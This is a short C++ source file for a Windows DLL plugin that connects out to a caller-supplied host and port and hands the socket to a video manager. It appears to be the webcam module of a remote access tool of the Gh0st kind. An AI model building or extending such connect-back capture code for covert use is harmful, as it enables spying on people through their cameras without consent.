// PluginVideo.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include "VideoManager.h"
#include "../Dllcomment/ClientSocket.h"

extern "C" __declspec(dllexport) bool Main(LPCTSTR lpszHost, UINT nPort, LPBYTE blparam)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(lpszHost, nPort))
		return -1;
	
	CVideoManager	manager(&socketClient);
	
	socketClient.run_event_loop();
	
	return 0;
}

extern "C" __declspec(dllexport) char * Version() //SOCKET sRemote)
{
	return "Video v1.0";
}
